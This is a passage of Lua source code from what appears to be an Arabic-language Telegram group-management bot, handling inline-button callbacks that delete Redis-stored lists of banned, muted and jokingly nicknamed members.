LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح جميع الجلاب المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Delmar') then
local UserId = Text:match('(%d+)/Delmar')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."mar:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح جميع حمير المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Delsmb') then
local UserId = Text:match('(%d+)/Delsmb')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."smb:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح جميع النثيه الي هنا ف المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Del2rd') then
local UserId = Text:match('(%d+)/Del2rd')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."2rd:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح جميع القرود", 'md', false)
end
elseif Text and Text:match('(%d+)/Del3ra') then
local UserId = Text:match('(%d+)/Del3ra')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."3ra:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح جميع اولادك", 'md', false)
end
elseif Text and Text:match('(%d+)/Del8by') then
local UserId = Text:match('(%d+)/Del8by')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."8by:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح جميع الأغبياء", 'md', false)
end
elseif Text and Text:match('(%d+)/BanAll') then
local UserId = Text:match('(%d+)/BanAll')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."BanAll:Groups") 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح المحظورين عام", 'md', false)
end
elseif Text and Text:match('(%d+)/ktmAll') then
local UserId = Text:match('(%d+)/ktmAll')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."ktmAll:Groups") 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح المكتومين عام", 'md', false)
end
elseif Text and Text:match('(%d+)/BanGroup') then
local UserId = Text:match('(%d+)/BanGroup')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."BanGroup:Group"..ChatId) 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح المحظورين", 'md', false)
end
elseif Text and Text:match('(%d+)/SilentGroupGroup') then
local UserId = Text:match('(%d+)/SilentGroupGroup')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."SilentGroup:Group"..ChatId) 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح المكتومين", 'md', false)
end
end
end
end
luatele.run(CallBackLua)